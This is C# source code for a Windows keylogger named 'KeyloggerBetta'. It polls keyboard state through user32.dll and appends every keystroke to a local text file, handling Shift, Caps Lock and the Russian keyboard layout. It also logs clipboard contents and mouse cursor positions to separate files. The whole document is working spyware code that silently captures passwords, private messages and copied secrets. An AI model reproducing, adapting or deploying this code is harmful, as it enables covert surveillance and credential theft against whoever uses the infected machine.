using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;
using System.Threading;

namespace KeyloggerBetta
{
    static class Program
    {
        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId([In] IntPtr hWnd, [Out, Optional] IntPtr lpdwProcessId);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout([In] int idThread);

        [DllImport("user32.dll")]
        static extern int GetAsyncKeyState(int i);

        static bool capsLockMode = Console.CapsLock;

        [STAThread]
        static void Main(String[] args)
        {
            string oldClipboard = "";
            string newClipboard = "";
            int newX = 0;
            int newY = 0;
            int oldX = 0;
            int oldY = 0;
            int counter = 0;
            bool[] access = new bool[256];
            for (int i = 0; i < 256; i++)
                access[i] = true;
            while (true)
            {
                Thread.Sleep(10);

                if (counter < 100)
                {
                    counter++;
                }
                else
                {
                    counter = 0;
                    newX = Cursor.Position.X;
                    newY = Cursor.Position.Y;
                    if (newX != oldX || newY != oldY)
                    {
                        oldX = newX;
                        oldY = newY;
                        File.AppendAllText("CursorPositonRecord.txt", "(" + newX + " : " + newY + ") ");
                    }
                    newClipboard = Clipboard.GetText();
                    if (newClipboard != oldClipboard)
                    {
                        File.AppendAllText("ClipboardRecord.txt", "/////////////////////////////////////////////\r\n" + newClipboard + "\r\n");
                        oldClipboard = newClipboard;
                    }
                }

                MakeKeyloggerStep(access);
            }
        }

        static void MakeKeyloggerStep(bool[] access)
        {

            string buf = "";
            if (GetAsyncKeyState(20) != 0)
            {
                if (access[20] == true)
                {
                    capsLockMode = !capsLockMode;
                    access[20] = false;
                }
            }
            else
            {
                access[20] = true;
            }

            RecordSingleValue(9, "<tab>", access);
            RecordSingleValue(12, "<enter>", access);
            RecordSingleValue(13, "<enter>", access);
            RecordSingleValue(17, "<ctrl>", access);
            RecordSingleValue(18, "<alt>", access);
            RecordSingleValue(27, "<esc>", access);
            RecordSingleValue(32, "<space>", access);
            RecordSingleValue(33, "<PgUp>", access);
            RecordSingleValue(34, "<PgDown>", access);
            RecordSingleValue(35, "<end>", access);
            RecordSingleValue(36, "<home>", access);
            RecordSingleValue(37, "<left>", access);
            RecordSingleValue(38, "<up>", access);
            RecordSingleValue(39, "<right>", access);
            RecordSingleValue(40, "<down>", access);
            RecordSingleValue(44, "<PrtScr>", access);
            RecordSingleValue(45, "<insert>", access);
            RecordSingleValue(45, "<delete>", access);
            RecordSingleValue(91, "<win>", access);
            RecordSpecialValue(192, "`", access);
            RecordSpecialValue(219, "[", access);
            RecordSpecialValue(221, "]", access);
            RecordSpecialValue(220, "\\", access);
            RecordSpecialValue(186, ";", access);
            RecordSpecialValue(222, "'", access);
            RecordSpecialValue(188, ",", access);
            RecordSpecialValue(190, ".", access);
            RecordSpecialValue(191, "/", access);
            for (int i = 48; i < 58; i++)
            {
                if (GetAsyncKeyState(i) != 0)
                {
                    if (access[i] == true)
                    {
                        buf = (i - 48).ToString();
                        if (GetAsyncKeyState(160) != 0 || GetAsyncKeyState(161) != 0)
                        {
                            buf = ConvertToShift(buf);
                        }
                        if (KeysIsRussian())
                        {
                            buf = ConvertToRus(buf);
                        }
                        File.AppendAllText("KeyRecord.txt", buf + " ");
                        access[i] = false;
                    }
                }
                else
                {
                    access[i] = true;
                }
            }
            for (int i = 65; i < 91; i++)
            {
                if (GetAsyncKeyState(i) != 0)
                {
                    if (access[i] == true)
                    {
                        buf = ((char)(i + 32)).ToString();
                        if (capsLockMode)
                        {
                            if (GetAsyncKeyState(160) == 0 || GetAsyncKeyState(161) == 0)
                            {
                                buf = ConvertToShift(buf);
                            }
                        }
                        else if (GetAsyncKeyState(160) != 0 || GetAsyncKeyState(161) != 0)
                        {
                            buf = ConvertToShift(buf);
                        }
                        if (KeysIsRussian())
                        {
                            buf = ConvertToRus(buf);
                        }
                        File.AppendAllText("KeyRecord.txt", buf + " ");
                        access[i] = false;
                    }
                }
                else
                {
                    access[i] = true;
                }
            }

            for (int i = 96; i < 106; i++)
            {
                if (GetAsyncKeyState(i) != 0)
                {
                    if (access[i] == true)
                    {
                        File.AppendAllText("KeyRecord.txt", (i - 96).ToString() + " ");
                        access[i] = false;
                    }
                }
                else
                {
                    access[i] = true;
                }
            }
            RecordSingleValue(106, "*", access);
            RecordSingleValue(107, "+", access);
            if (GetAsyncKeyState(110) != 0)
            {
                if (access[110] == true)
                {
                    if (KeysIsRussian())
                    {
                        File.AppendAllText("KeyRecord.txt", ", ");
                    }
                    else
                    {
                        File.AppendAllText("KeyRecord.txt", ". ");
                    }
                    access[110] = false;
                }
            }
            else
            {
                access[110] = true;
            }
            RecordSingleValue(109, "-", access);
            RecordSingleValue(111, "/", access);
            for (int i = 112; i < 144; i++)
            {
                if (GetAsyncKeyState(i) != 0)
                {
                    if (access[i] == true)
                    {
                        File.AppendAllText("KeyRecord.txt", "<F" + (i - 110).ToString() + "> ");
                        access[i] = false;
                    }
                }
                else
                {
                    access[i] = true;
                }
            }

        }

        static void RecordSingleValue(int i, string value, bool[] access)
        {
            if (GetAsyncKeyState(i) != 0)
            {
                if (access[i] == true)
                {
                    File.AppendAllText("KeyRecord.txt", value + " ");
                    access[i] = false;
                }
            }
            else
            {
                access[i] = true;
            }
        }
        static void RecordSpecialValue(int i, string value, bool[] access)
        {
            if (GetAsyncKeyState(i) != 0)
            {
                if (access[i] == true)
                {
                    if (GetAsyncKeyState(160) != 0 || GetAsyncKeyState(161) != 0)
                    {
                        value = ConvertToShift(value);
                    }
                    if (KeysIsRussian())
                    {
                        value = ConvertToRus(value);
                    }
                    File.AppendAllText("KeyRecord.txt", value + " ");
                    access[i] = false;
                }
            }
            else
            {
                access[i] = true;
            }
        }
        static string ConvertToRus(string str)
        {
            string res = "";

            string rusKey = "Ё!\"№;%:?*()_+ЙЦУКЕНГШЩЗХЪ/ФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,ё1234567890-=йцукенгшщзхъ\\фывапролджэячсмитьбю. ";
            string engKey = "~!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJKL:\"ZXCVBNM<>?`1234567890-=qwertyuiop[]\\asdfghjkl;'zxcvbnm,./ ";

            for (int i = 0; i < str.Length; i++)
            {
                res += rusKey[engKey.IndexOf(str[i])];
            }

            return res;
        }

        static string ConvertToShift(string str)
        {
            string res = "";

            string endKey = "~!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJKL:\"ZXCVBNM<>?";
            string startKey = "`1234567890-=qwertyuiop[]\\asdfghjkl;'zxcvbnm,./";

            for (int i = 0; i < str.Length; i++)
            {
                res += endKey[startKey.IndexOf(str[i])];
            }

            return res;
        }

        static bool KeysIsRussian()
        {
            if (GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero)) == 1049)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}

